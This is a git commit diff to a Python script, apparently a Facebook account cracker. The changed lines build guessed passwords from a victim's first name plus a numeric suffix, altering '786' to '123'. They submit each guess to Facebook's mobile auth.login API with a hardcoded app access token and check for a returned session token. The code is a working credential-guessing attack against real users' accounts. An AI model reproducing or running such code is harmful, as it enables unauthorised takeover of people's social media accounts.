dd34efc492064dc3c736185e4442ee040c3727b2
hackers1992 <67794098+hackers1992@users.noreply.github.com>
2020-07-03 20:02:42 +0500

    Update 3.py

--- 3.py
+++ 3.py
@@ -4944,7 +4944,7 @@ def action():
  					     				   cps.close()
  					      				   cpb.append(c+user+pass5)
 								    else:
- 				  				           pass6= b['first_name'] + "786"
+ 				  				           pass6= b['first_name'] + "123"
  							                   data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
  				 				           q = json.load(data)
  				  				           if 'access_token' in q:
